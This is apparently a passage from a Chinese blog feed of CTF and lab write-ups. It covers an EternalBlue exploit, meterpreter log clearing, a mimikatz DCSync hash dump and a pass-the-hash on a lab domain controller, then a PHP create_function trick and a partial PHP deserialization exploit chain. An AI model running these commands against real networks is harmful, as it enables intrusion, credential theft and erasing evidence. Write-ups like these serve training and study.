exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution<br>   11    \_ target: Automatic                         .                .        .      .<br>   12    \_ target: PowerShell                        .                .        .      .<br>   13    \_ target: Native upload                     .                .        .      .<br>   14    \_ target: MOF upload                        .                .        .      .<br>   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   16    \_ AKA: ETERNALROMANCE                       .                .        .      .<br>   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   18    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution<br>   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .<br>   21    \_ AKA: ETERNALROMANCE                       .                .        .      .<br>   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .<br>   23    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection<br>   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .<br>   26    \_ AKA: ETERNALBLUE                          .                .        .      .<br>   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution<br>   28    \_ target: Execute payload (x64)             .                .        .      .<br>   29    \_ target: Neutralize implant                .                .        .      .<br><br><br>Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce<br>After interacting with a module you can manually <span class="hljs-built_in">set</span> a TARGET with <span class="hljs-built_in">set</span> TARGET <span class="hljs-string">&#x27;Neutralize implant&#x27;</span><br></code></pre></td></tr></table></figure><p>第一个模块影响版本比较多，所以使用它进行后续操作</p><p>依次输入以下命令发起永恒之蓝攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue  <span class="hljs-comment"># 选择使用的模块</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="hljs-comment"># 设置payload，可以通过show payloads查看</span><br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21  <span class="hljs-comment"># 设置靶机的ip</span><br>exploit  <span class="hljs-comment"># 发起攻击</span><br></code></pre></td></tr></table></figure><p>运行成功会出现<code>meterpreter&gt;</code></p><p>该<code>Meterpreter</code>是<code>metasploit</code>的一个扩展模块，可以调用<code>metasploit</code>的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传/下载文件、创建持久后门等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 介绍一些该模块常用的命令</span><br>meterpreter &gt; screenshot <span class="hljs-comment"># 捕获屏幕</span><br>meterpreter &gt; upload hello.txt c:// <span class="hljs-comment">#上传文件</span><br>meterpreter &gt; download d://1.txt <span class="hljs-comment"># 下载文件</span><br>meterpreter &gt; shell <span class="hljs-comment"># 获取cmd</span><br>meterpreter &gt; clearev <span class="hljs-comment"># 清除日志</span><br></code></pre></td></tr></table></figure><p>虽然打入了该主机，但此主机上并无flag,最后的flag在windows DC 域控制器里</p><p>接下来需要通过<code>DCSync</code>来导出所有用户的 hash </p><blockquote><p>DC（Domain Controller，域控制器）是 Windows 域网络架构中的核心服务器，</p><p>负责管理并维护域中的所有用户、计算机、组和策略等信息。</p><p>在企业环境中，域控制器主要通过 Active Directory（AD）来管理和验证用户身份，实现资源的集中控制和网络安全管理。</p></blockquote><blockquote><p>DCSync 攻击基于微软的 Active Directory 复制协议（Directory Replication Service，DRS）。</p><p>在 Windows 域中，多个域控制器（DC）之间会进行数据同步，以确保所有 DC 拥有一致的用户凭据、组策略和其他目录信息。</p><p>DCSync 攻击的关键在于，攻击者可以伪装成一个域控制器，通过 DRS 协议向其他域控制器请求复制敏感的身份数据。</p><p>具体来说，DCSync 攻击会模拟一个合法的域控制器发起同步请求。其他域控制器在收到请求时，会按照 Active Directory 复制机制，将存储的凭据信息传送给请求者，而攻击者便可以利用该机制轻松获得：</p><ul><li>用户的 NTLM 哈希：用于解密或破解用户密码。</li><li>Kerberos 密钥（AES 哈希）：用于生成 Kerberos 票证。</li><li>Kerberos TGT 密钥：可用于持久性攻击，创建伪造的 TGT（Ticket Granting Ticket）。</li></ul></blockquote><blockquote><p>DCSync 攻击要求攻击者获得相当高的权限才能执行。以下是实现 DCSync 攻击的主要前提：</p><ul><li><strong>域管理员（Domain Admins）或企业管理员（Enterprise Admins）权限</strong>：通常只有域管理员才有足够的权限发起 DRS 请求以提取凭据。</li><li><strong>获取到管理权限的账户（如 <code>Replicator</code> 组）</strong>：具备特定权限的用户或服务账户也可能拥有域复制权限。</li></ul></blockquote><p>然后进行哈希传递攻击实现<code>DC</code>上的任意命令执行</p><blockquote><p>在 Windows 系统中，身份验证过程使用 NTLM 哈希来验证用户身份。</p><p>当用户登录时，系统会生成用户的 NTLM 哈希并将其发送给身份验证服务（如域控制器），以确认用户的身份。</p><p>而在 Pass-the-Hash 哈希传递攻击中，攻击者获取到 NTLM 哈希后，直接使用该哈希来模拟登录，不需要知道密码的明文：</p><ul><li><strong>获取凭据哈希</strong>：攻击者首先在目标系统上通过技术手段（如内存提取、Mimikatz 工具、或 NTLM 哈希窃取工具）获得用户的 NTLM 哈希值。</li><li><strong>伪装身份登录</strong>：攻击者在其他系统上使用该哈希进行身份验证，以便模拟被攻击用户的身份完成登录。此时身份验证服务会认为攻击者是该用户，因为哈希值有效。</li></ul></blockquote><p>输入以下命令来获取用户的 hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">load kiwi  # 调用mimikatz模块，mimikatz是一款著名的内存提取工具，可以用于获取密码明文、哈希值、Kerberos 票证等<br>kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit  # 导出域内所有用户的信息(包括哈希值)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; load kiwi<br>Loading extension kiwi...<br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/<br><br>Success.<br>meterpreter &gt; kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514<br>1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512<br>1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512<br>1000    DC01$   65bfc1d9a84f50b1459c71db9b06d31a        532480<br>500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512<br>1104    XIAORANG-OA01$  23365b4993b59801527157c04c58b057        4096<br>1108    XIAORANG-WIN7$  b705f720ab6702d623f854bbf3299d22        4096<br><br>mimikatz(powershell) <span class="hljs-comment"># exit</span><br>Bye!<br></code></pre></td></tr></table></figure><p>提取<code>Administrator</code>用户的 hash</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Administrator</span>   <span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8<br></code></pre></td></tr></table></figure><p>使用<code>crackmapexec</code>来进行哈希传递攻击</p><p><code>crackmapexec</code> 是一个渗透测试工具，用于测试 SMB、SSH、LDAP 等服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br>SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)<br>SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)<br>SMB         172.22.1.2      445    DC01             [+] Executed <span class="hljs-built_in">command</span> <br>SMB         172.22.1.2      445    DC01             ___   ___<br>SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )<br>SMB         172.22.1.2      445    DC01             \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //<br>SMB         172.22.1.2      445    DC01             / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____<br>SMB         172.22.1.2      445    DC01             / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /<br>SMB         172.22.1.2      445    DC01             / /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             flag03: e8f88d0d43d6&#125;<br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             <br>SMB         <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span>      <span class="hljs-number">445</span>    DC01             Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chimedal.github.io/2024/09/22/Initial/index.html">春秋云境-Initial | Chimedal</a></p><p><a href="https://qanux.github.io/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">春秋云境Initial详解 | Qanux’s space</a></p><p><a href="https://blog.csdn.net/weixin_63576152/article/details/133462469">春秋云境Initial-WP（附带详细代理过程）_172.22.1.18v-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110389330">工具之使用教程Neo-reGeorg_neoregeorg-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_41538012/article/details/115325944">超详细虚拟机与主机网络连接以及互Ping不通问题的解决_桥接模式windows2008虚拟机ping主机-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2018 annonymous</title>
    <link href="/2024/07/28/SUCTF2018-annonymous/"/>
    <url>/2024/07/28/SUCTF2018-annonymous/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);   <span class="hljs-comment">//创建匿名函数</span><br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));   <span class="hljs-comment">//生成随机哈希值</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span>               <span class="hljs-comment">//定义一个函数</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>目的很明确</p><p>用<code>$_GET[&quot;func_name&quot;]();</code> 通过执行<code>SUCTF_$hash()</code>进而执行 <code>$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</code>创建的匿名函数</p><p>但是<code>$hash</code>得不到，无法执行<code>SUCTF_$hash()</code></p><p><code>create_function()</code>函数在创建之后会生成一个函数名为：<code>%00lambda_[1-···] </code>  后面的数字是递增的</p><p>因此创建的匿名函数其实是有名字的，例如<code>%00lambda_1</code> 、<code>%00lambda_13  </code> 、<code> %00lambda_55</code></p><p>因此可以绕过<code>SUCTF_$hash()</code>，直接执行匿名函数</p><p>这里有两种方法，</p><p>第一种是直接爆破，这个很简单就不多说了</p><p>第二种是通过大量的请求来迫使<code>Pre-fork</code>模式启动，Apache启动新的线程，这样这里的函数名后面的数字会刷新为1</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Apache服务器的<code>Pre-fork</code>模式意味着在服务器启动时，就会预先创建一定数量的子进程（工作进程），用于处理客户端的请求。</p><p>我们可以通过发送大量请求来增加服务器的负载。</p><p>如果请求足够多，将会耗尽所有预先创建的子进程。</p><p>这时，Apache服务器会启动新的子进程来处理额外的负载</p><p>启动新的子进程时，用于生成函数名的计数器将会重置</p><p><code>%00lambda_[1-···] </code>  后面的数字会从1开始重新计数。</p><p><img src="https://s2.loli.net/2024/07/28/h4vr8KjOyecHRga.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2019 Upload</title>
    <link href="/2024/07/22/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%5D%20Upload/"/>
    <url>/2024/07/22/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%5D%20Upload/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2019-Upload"><a href="#强网杯2019-Upload" class="headerlink" title="强网杯2019 Upload"></a>强网杯2019 Upload</h1><p>目录扫描发现源码泄露 <code>www.tar.gz</code></p><p>直接看文件上传部分的关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;checker)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">login_check</span>())&#123;       <span class="hljs-comment">#登录检测，登录后才能进行文件上传操作</span><br>            <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;          <span class="hljs-comment">#检查是否上传了文件，如果上传了文件进入该if语句</span><br>        <span class="hljs-variable language_">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ext_check</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ext) &#123;            <span class="hljs-comment">#这个是文件后缀名，文件有后缀名就可以进入</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp)) &#123;   <span class="hljs-comment">#这里判断文件类型使用了getimagesize</span><br>            @<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp, <span class="hljs-variable">$this</span>-&gt;filename);    <span class="hljs-comment">#复制文件</span><br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp);<br>            <span class="hljs-variable language_">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">update_img</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码将上传的文件的文件名修改为以<code>.png</code>结尾</p><p>并用<code>getimagesize</code>函数检查文件类型</p><p><code>getimagesize()</code>会通过读取图片文件的头部信息来确定图片的大小和类型</p><p>所以需要上传图片马。</p><p>由于文件名被修改，图片马无法直接使用，</p><p>需要配合文件包含，或者将文件名修改为<code>.php</code>结尾。</p><p>在login_check函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">cookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>       <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;profile=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$profile</span>));   <span class="hljs-comment">#这里有对cookie的反序列化操作</span><br>           <span class="hljs-variable language_">$this</span>-&gt;profile_db=<span class="hljs-title function_ invoke__">db</span>(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;<span class="hljs-title function_ invoke__">find</span>();<br>           <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_diff</span>(<span class="hljs-variable">$this</span>-&gt;profile_db,<span class="hljs-variable">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>           &#125;<span class="hljs-keyword">else</span>&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>发现cookie是序列化的数据，网站读取cookie时会进行反序列化操作。</p><p>Register类中有__destruct方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此可以把Register类当作反序列化的入口类。</p><p>再结合Profile类中的两个魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现调用<code>upload_img</code>方法更改文件名。</p><p>反序列化链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>. R<span class="hljs-function"><span class="hljs-title">egister</span>-&gt;</span>__destruct<br><span class="hljs-number">2</span>. P<span class="hljs-function"><span class="hljs-title">rofile</span>-&gt;</span>__call<br><span class="hljs-number">3</span>. P<span class="hljs-function"><span class="hljs-title">rofile</span>-&gt;</span>upload_img<br></code></pre></td></tr></table></figure><p>在网页源码中找到已经上传的图片马的路径</p><p><img src="https://s2.loli.net/2024/07/23/waRoyLm5xh6OHKA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">web</span>\<span class="hljs-title class_">controller</span>;   <span class="hljs-comment">//命名空间，这句必须有</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$index</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Register</span>();<br><span class="hljs-variable">$a</span>-&gt;registed=<span class="hljs-literal">false</span>;   <span class="hljs-comment">//用于进入__destruct()中的if语句</span><br><span class="hljs-variable">$a</span>-&gt;checker=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>();<br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-literal">false</span>;    <span class="hljs-comment">//跳过upload_img()中的第一个if，登录检测</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;index=<span class="hljs-string">&quot;upload_img&quot;</span>;    <span class="hljs-comment">//调用__call()时使$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments)形成$this-&gt;upload_img($arguments)的效果</span><br><span 